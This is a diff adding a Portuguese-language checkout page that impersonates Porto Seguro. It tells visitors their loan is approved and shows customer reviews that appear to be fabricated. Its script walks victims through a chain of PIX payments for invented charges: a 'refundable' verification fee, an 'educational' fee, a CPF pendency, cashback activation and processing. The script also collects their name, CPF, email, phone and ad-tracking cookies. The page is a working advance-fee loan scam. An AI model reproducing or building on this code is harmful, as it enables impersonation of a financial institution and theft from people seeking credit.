+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Meu score era muito baixo e mesmo assim consegui. O valor caiu certinho e consegui pagar minhas dívidas. Muito grata!</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%232563EB'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23BFDBFE'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23BFDBFE'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%2393C5FD'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%2393C5FD'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Lucas Ferreira</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20" style="fill:#D1D5DB;color:#D1D5DB;"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Processo rápido e sem burocracia. Fiz tudo pelo celular em 5 minutos e recebi no mesmo dia. Nota 10.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23DB2777'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23FBCFE8'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23FBCFE8'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23F9A8D4'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23F9A8D4'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Amanda Santos</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Sempre tive medo de pedir empréstimo online mas a Porto me surpreendeu. Atendimento ótimo e o dinheiro caiu rapidinho na minha conta.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    "use strict";
+    var OFFER = 'up5';
+
+    // Copy dinâmica do header por offer
+    var OFFER_COPY = {
+      'main': {
+        badge: 'Aprovado',
+        title: 'Seu empréstimo foi <span class="hl">aprovado com sucesso!</span>',
+        sub: 'O valor já está reservado para <strong>liberação imediata</strong>. Finalize o pagamento abaixo para confirmar.'
+      },
+      'up1': { badge: 'Verificação Obrigatória', title: 'Taxa de <span class="hl">Verificação de Conta</span>', sub: 'Para liberar o valor com segurança, confirme a <strong>Taxa de Verificação de Conta</strong>. Essa taxa é <strong>reembolsável</strong> junto com o empréstimo.' },
+      'up2': { badge: 'Liberação Final', title: 'Confirmação para a <span class="hl">liberação final</span>', sub: 'Última verificação de titularidade necessária para a <strong>liberação total do valor</strong> na sua conta.' },
+      'up3': { badge: 'Taxa Educacional', title: 'Taxa <span class="hl">Educacional obrigatória</span>', sub: 'Contribuição <strong>educacional obrigatória</strong> exigida na contratação. Conclua o pagamento para prosseguir com a liberação.' },
+      'up4': { badge: 'Regularização', title: 'Regularização de <span class="hl">pendência no CPF</span>', sub: 'Quite a <strong>pendência identificada no seu CPF</strong> para regularizar seu nome e liberar o valor aprovado.' },
+      'up5': { badge: 'Cashback', title: 'Ativação do <span class="hl">Cashback Porto</span>', sub: 'Ative seu cashback e <strong>receba de volta todas as taxas pagas</strong> após a confirmação do empréstimo.' },
+      'up6': { badge: 'Processamento', title: 'Taxa de <span class="hl">processamento bancário</span>', sub: 'Taxa operacional final para garantir que o <strong>valor seja liberado com segurança</strong> na sua conta.' }
+    };
+
+    var NEXT_MAP = {
+      'main': '../upsell/1/',
+      'up1':  '../upsell/2/',
+      'up2':  '../upsell/3/',
+      'up3':  '../upsell/4/',
+      'up4':  '../upsell/5/',
+      'up5':  '../upsell/6/',
+      'up6':  '../upsell/7/',
+      'up7':  '../upsell/8/',
+      'up8':  '../upsell/9/',
+      'up9':  '../upsell/10/',
+      'up10': '../upsell/11/',
+      'up11': 'https://bancoporto.com.br/'
+    };
+    var UPSELL_URL = '../6/';
+    var PRICE_MAP = {
+      'main': 'R$ 36,84',
+      'up1':  'R$ 26,81',
+      'up2':  'R$ 26,41',
+      'up3':  'R$ 23,44',
+      'up4':  'R$ 19,90',
+      'up5':  'R$ 17,00',
+      'up6':  'R$ 28,79'
+    };
+    var totalEl = document.getElementById('totalAmount');
+    var pixTotalFromUrl = new URLSearchParams(window.location.search).get('pix_total');
+    if (totalEl) {
+      // pix_total só vale pro offer main (seguro dinâmico + bump) — nos upsells, usar PRICE_MAP
+      if (OFFER === 'main' && pixTotalFromUrl) {
+        totalEl.textContent = Number(pixTotalFromUrl).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      } else if (PRICE_MAP[OFFER]) {
+        totalEl.textContent = PRICE_MAP[OFFER];
+      }
+    }
+    var API = location.origin + '/php/api.php';
+
+    // ---------- Helpers ----------
+    function $(id){ return document.getElementById(id); }
+    function qp(){ return new URLSearchParams(window.location.search); }
+    function digits(s){ return (s||'').replace(/\D+/g,''); }
+
+    // ---------- Dados do cliente (URL -> localStorage) ----------
+    function pick(urlKey, lsKeys){
+      var v = qp().get(urlKey);
+      if (v) return v;
+      for (var i=0;i<lsKeys.length;i++){ var x = localStorage.getItem(lsKeys[i]); if (x) return x; }
+      return '';
+    }
+    var customer = {
+      name:     pick('name',      ['nome']),
+      document: digits(pick('document', ['cpf'])),
+      email:    pick('email',     ['email']),
+      phone:    digits(pick('telephone', ['telephone','telefone']))
+    };
+
+    // ---------- Captura de TODAS as UTMs / parâmetros de rastreio ----------
+    function getUTMs(){
+      var utms = {};
+      // 1) URL atual
+      qp().forEach(function(v,k){ if(v) utms[k]=v; });
+      // 2) sessão isolada da ABA (utm-supermini) — não mistura leads
+      try {
+        if (typeof window.getFunnelParams === 'function') {
+          window.getFunnelParams().forEach(function(v,k){ if(v && !utms[k]) utms[k]=v; });
+        }
+        if (typeof window.getFunnelSession === 'function') {
+          var fs = window.getFunnelSession();
+          if (fs && fs.session_id) utms.funnel_session_id = fs.session_id;
+          if (fs && fs.landing_url && !utms.landing_url) utms.landing_url = fs.landing_url;
+        }
+      } catch (e) {}
+      // 3) cookies ParceiroSocial
+      document.cookie.split(';').forEach(function(c){
+        var p=c.trim().split('='); if(['_fbc','_fbp'].indexOf(p[0])>=0 && !utms[p[0]]) utms[p[0]]=decodeURIComponent(p[1]||'');
+      });
+      return utms;
+    }
+    function appendUTMs(url){
+      var params = new URLSearchParams(getUTMs());
+      // Params internos do checkout que NÃO podem vazar pro próximo upsell
+      ['offer','pix_total','seguro_price','bump1','amount','cotacao_index'].forEach(function(k){ params.delete(k); });
+      var q = params.toString();
+      if(!q) return url;
+      return url + (url.indexOf('?')>=0 ? '&' : '?') + q;
+    }
+
+    // ---------- Preencher cabeçalho ----------
+    function renderHeader(){
+      var nome = $('leadNome');
+      if (customer.name){
+        var parts = customer.name.trim().split(/\s+/);
+        nome.textContent = parts.length>1 ? parts[0]+' '+parts[parts.length-1] : parts[0];
+      } else { nome.textContent = 'Cliente'; }
+      var d = customer.document;
+      if (d.length===11){ $('leadCPF').textContent = '***.'+d.slice(3,6)+'.'+d.slice(6,9)+'-**'; }
+      $('protocolNum').textContent = '#SS-' + (d ? d.slice(-4) : Math.floor(1000+Math.random()*9000));
+
+      // Copy dinâmica do header por offer
+      var copy = OFFER_COPY[OFFER] || OFFER_COPY['main'];
+      var badgeEl = $('haBadgeText');
+      var titleEl = $('haTitle');
+      var subEl = $('haSub');
+      if (badgeEl) badgeEl.textContent = copy.badge;
+      if (titleEl) titleEl.innerHTML = copy.title;
+      if (subEl) subEl.innerHTML = copy.sub;
+    }
+
+    // ---------- Estado ----------
+    var transactionId=null, convAmount=0, checkInterval=null, timerInterval=null, paymentHandled=false, pollInFlight=false;
+    var loading=$('loading'), qrContainer=$('qrContainer'), qrImage=$('qrImage'),
+        pixCode=$('pixCode'), pixCodeDisplay=$('pixCodeDisplay'), copyBtn=$('copyBtn'),
+        statusPending=$('statusPending'), statusSuccess=$('statusSuccess'),
+        statusError=$('statusError'), timer=$('timer');
+
+    // Hash curto da IDENTIDADE do cliente (nome+CPF+email+telefone).
+    // A chave do cache do PIX inclui esse hash: se o lead mudar (outro nome/CPF),
+    // gera-se um PIX novo em vez de reaproveitar o de outra pessoa. Corrige o caso
+    // de aparecer o nome de um terceiro como pagador ao dar F5.
+    function idHash(){
+      var s = (customer.name||'')+'|'+(customer.document||'')+'|'+(customer.email||'')+'|'+(customer.phone||'');
+      var h = 5381;
+      for (var i=0;i<s.length;i++){ h = ((h<<5)+h + s.charCodeAt(i)) >>> 0; }
+      return h.toString(36);
+    }
+    function pixCacheKey(){ return 'nbpix_'+OFFER+'_'+idHash(); }
+
+    // ---------- Gerar PIX ----------
+    // Lê a resposta como texto e converte para JSON com erro claro
+    // (evita o erro opaco "The string did not match the expected pattern." do Safari
+    //  quando o servidor devolve algo que não é JSON — página de erro, vazio, warning).
+    async function parseApiJson(res){
+      var text = '';
+      try { text = await res.text(); } catch(e){ text = ''; }
+      if (!text || !text.trim()){
+        throw new Error(res && res.ok ? 'Resposta vazia do servidor.' : ('Erro no servidor (' + (res ? res.status : '?') + '). Tente novamente.'));
+      }
+      try { return JSON.parse(text); }
+      catch(e){
+        var snippet = text.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim().slice(0,150);
+        throw new Error('Resposta inválida do servidor (' + (res ? res.status : '?') + '): ' + snippet);
+      }
+    }
+
+    async function generatePIX(){
+      try{
+        // Se ESTA etapa já foi paga neste navegador, NÃO gera outro PIX:
+        // impede o "PIX fantasma" e o travamento — o cliente pagava, voltava do app
+        // do banco, a página recarregava e ficava esperando um novo PIX que ninguém
+        // paga, sem nunca redirecionar. Aqui, se já pago, segue direto pro próximo passo.
+        var paidKey = 'nbpaid_'+OFFER+'_'+idHash();
+        var jaPago = false; try{ jaPago = !!localStorage.getItem(paidKey); }catch(e){}
+        if (jaPago){
+          try{ localStorage.removeItem(pixCacheKey()); }catch(e){}
+          var goURL = appendUTMs(UPSELL_URL);
+          if (window.top !== window) window.top.location.href = goURL; else window.location.href = goURL;
+          return;
+        }
+        // reaproveita PIX válido salvo (evita duplicar em F5)
+        var cached = null;
+        try{ cached = JSON.parse(localStorage.getItem(pixCacheKey())||'null'); }catch(e){}
+        if (cached && cached.expiresAt > Date.now() && cached.transaction_id){
+          transactionId = cached.transaction_id;
+          renderPix(cached.qr_code, cached.qr_code_base64);
+          startTimer(Math.floor((cached.expiresAt-Date.now())/1000));
+          startPolling();
+          return;
+        }
+
+        var generateBody = {
+            offer: OFFER,
+            name: customer.name, document: customer.document,
+            email: customer.email, phone: customer.phone,
+            utms: getUTMs()
+        };
+        // pix_total e bump só valem pro offer main (seguro dinâmico)
+        if (OFFER === 'main') {
+          if (pixTotalFromUrl) generateBody.pix_total = pixTotalFromUrl;
+          var bumpFromUrl = new URLSearchParams(window.location.search).get('bump1');
+          if (bumpFromUrl) generateBody.bump1 = bumpFromUrl;
+        }
+
+        var res = await fetch(API+'?action=generate',{
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(generateBody)
+        });
+        var data = await parseApiJson(res);
+        if (!data.success) throw new Error(data.error||'Erro ao gerar PIX');
+
+        // O servidor avisou que ESTA etapa já foi paga (mesmo CPF): segue direto
+        // pro próximo passo em vez de mostrar/gerar um PIX que ninguém vai pagar.
+        if (data.already_paid){
+          try{ localStorage.setItem('nbpaid_'+OFFER+'_'+idHash(), '1'); }catch(e){}
+          try{ localStorage.removeItem(pixCacheKey()); }catch(e){}
+          var goPaidURL = appendUTMs(UPSELL_URL);
+          if (window.top !== window) window.top.location.href = goPaidURL; else window.location.href = goPaidURL;
+          return;
+        }
+
+        transactionId = data.pix.transaction_id;
+        convAmount = Number(data.pix.amount) || 0;
+        renderPix(data.pix.qr_code, data.pix.qr_code_base64);
+
+        try{
+          localStorage.setItem(pixCacheKey(), JSON.stringify({
+            transaction_id: transactionId,
+            qr_code: data.pix.qr_code,
+            qr_code_base64: data.pix.qr_code_base64||'',
+            expiresAt: Date.now() + 24*60*60*1000
+          }));
+        }catch(e){}
+
+        startTimer(5*60);
+        startPolling();
+      }catch(err){
+        if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+          transactionId = 'DEMO_' + Date.now();
+          renderPix('00020126580014br.gov.bcb.pix0136demo-porto-checkout-visual-preview-only', '');
+          startTimer(5*60);
+        } else {
+          showError(err && err.message ? err.message : 'Falha ao gerar PIX. Tente novamente.');
+        }
+      }
+    }
+
+    function renderPix(code, base64){
+      var done = false;
+      // 1) imagem enviada pelo gateway (se houver)
+      if (base64){
+        qrImage.src = base64.indexOf('data:')===0 ? base64 : 'data:image/png;base64,'+base64;
+        done = true;
+      }
+      // 2) gera o QR localmente a partir do código copia-e-cola (sem serviço externo)
+      if (!done && window.qrcode && code){
+        try{
+          var qr = qrcode(0, 'M');
+          qr.addData(code);
+          qr.make();
+          qrImage.src = qr.createDataURL(6, 8);
+          done = true;
+        }catch(e){}
+      }
+      // 3) último recurso: serviço externo de QR
+      if (!done){
+        qrImage.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(code);
+      }
+      pixCode.value = code;
+      pixCodeDisplay.textContent = code;
+      loading.classList.add('hidden');
+      qrContainer.style.display = 'block';
+      statusPending.classList.remove('hidden');
+    }
+
+    function showError(msg){
+      loading.classList.add('hidden');
+      while(statusError.firstChild) statusError.removeChild(statusError.firstChild);
+      var p=document.createElement('div'); p.textContent = msg && msg.length<280 ? msg : 'Falha ao gerar PIX. Tente novamente.'; p.style.marginBottom='10px';
+      var b=document.createElement('button'); b.type='button'; b.textContent='Tentar novamente';
+      b.style.cssText='background:var(--primary);color:#0099FF;border:none;border-radius:8px;padding:10px 22px;font-weight:700;cursor:pointer;font-family:inherit;';
+      b.onclick=function(){ statusError.classList.add('hidden'); loading.classList.remove('hidden'); generatePIX(); };
+      statusError.appendChild(p); statusError.appendChild(b);
+      statusError.classList.remove('hidden');
+    }
+
+    // ---------- Copiar ----------
+    copyBtn.addEventListener('click', function(){
+      var code = pixCode.value;
+      function ok(){ copyBtn.classList.add('copied'); $('copyBtnText').textContent='Código copiado!'; setTimeout(function(){ copyBtn.classList.remove('copied'); $('copyBtnText').textContent='Copiar código PIX'; },2200); }
+      if (navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(code).then(ok).catch(fallback);
+      } else { fallback(); }
+      function fallback(){
+        var t=document.createElement('textarea'); t.value=code; t.readOnly=false; t.contentEditable='true';
+        t.style.position='fixed'; t.style.top='0'; t.style.left='0'; t.style.opacity='0'; t.style.fontSize='16px';
+        document.body.appendChild(t);
+        try{
+          var range=document.createRange(); range.selectNodeContents(t);
+          var sel=window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
+          t.setSelectionRange(0, code.length);
+        }catch(e){ t.select(); }
+        try{ document.execCommand('copy'); ok(); }catch(e){} document.body.removeChild(t);
+      }
+    });
+
+    // ---------- Timer ----------
+    function startTimer(seconds){
+      var remaining = seconds;
+      function upd(){
+        var m=Math.floor(remaining/60), s=remaining%60;
+        timer.textContent = 'Expira em '+m+':'+(s<10?'0':'')+s;
+        if (remaining<=0){
+          clearInterval(timerInterval); timerInterval=null;
+          timer.textContent='Aguardando confirmação…';
+          var t=statusPending.querySelector('.m2-status-text'); if(t) t.textContent='Ainda verificando. Você pode pagar pelo app do banco.';
+        }
+        remaining--;
+      }
+      upd(); timerInterval=setInterval(upd,1000);
+    }
+
+    // ---------- Polling de pagamento ----------
+    // Uma única verificação de status (reutilizada pelo intervalo e pelo foco da aba).
+    async function pollStatus(){
+      if (pollInFlight || paymentHandled || !transactionId) return;
+      pollInFlight=true;
+      try{
+        var res = await fetch(API+'?action=status',{
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ transaction_id: transactionId })
+        });
+        var r = await parseApiJson(res);
+        if (r && r.success && r.status==='paid') paymentConfirmed();
+      }catch(e){}
+      finally{ pollInFlight=false; }
+    }
+
+    function startPolling(){
+      if (checkInterval) clearInterval(checkInterval);
+      // 1ª checagem quase imediata (1,2s) e depois a cada 3s (dentro da faixa 2–4s)
+      setTimeout(pollStatus, 1200);
+      checkInterval = setInterval(pollStatus, 3000);
+
+      // Ao voltar o foco para a aba, verifica na hora (paga pelo app do banco).
+      document.addEventListener('visibilitychange', function(){
+        if (document.visibilityState==='visible') pollStatus();
+      });
+    }
+
+    // ---------- Pagamento confirmado -> upsell ----------
+    function paymentConfirmed(){
+      if (paymentHandled) return;
+      paymentHandled=true;
+      clearInterval(checkInterval); checkInterval=null;
+      clearInterval(timerInterval); timerInterval=null;
+      // Marca a etapa como paga (persiste): se a página recarregar depois do pagamento,
+      // o generatePIX vê essa marca e redireciona em vez de gerar um PIX fantasma.
+      try{ localStorage.setItem('nbpaid_'+OFFER+'_'+idHash(), '1'); }catch(e){}
+      try{ localStorage.removeItem(pixCacheKey()); }catch(e){}
+
+      statusPending.classList.add('hidden');
+      statusSuccess.classList.remove('hidden');
+      timer.classList.add('hidden');
+
+      var priceVal = {'main':36.84,'up1':26.81,'up2':26.41,'up3':23.44,'up4':19.90,'up5':17.00,'up6':28.79};
+      var convValue = priceVal[OFFER] || 36.84;
+      try { if (window.trackPurchase) window.trackPurchase(convAmount || convValue, transactionId); } catch(e){}
+      var redirectDone = false;
+
+      function doRedirect(){
+        if (redirectDone) return;
+        redirectDone = true;
+        var url = appendUTMs(UPSELL_URL);
+        if (window.top !== window) window.top.location.href = url; else window.location.href = url;
+      }
+
+      setTimeout(doRedirect, 1500);
+    }
+
+    // ---------- Init ----------
+    renderHeader();
+    try{ var _rec=document.getElementById('btnRecusar'); if(_rec){ _rec.setAttribute('href', appendUTMs('../final/')); } }catch(e){}
+    generatePIX();
+  })();
+  </script>
+
+
+
+<!-- FOOTER Porto -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../../images/logo.png" alt="Porto"></div>
+  <p class="ss-footer-company">&copy; 2026 Porto Seguro &ndash; Instituição Financeira.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Porto, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Porto é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Porto coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@bancoporto.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 30.680.829/0001-43</p><p><strong>Razão Social:</strong> Porto Seguro</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll(".ss-dialog").forEach(function(d){d.addEventListener("click",function(e){if(e.target===d)d.close();});});
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
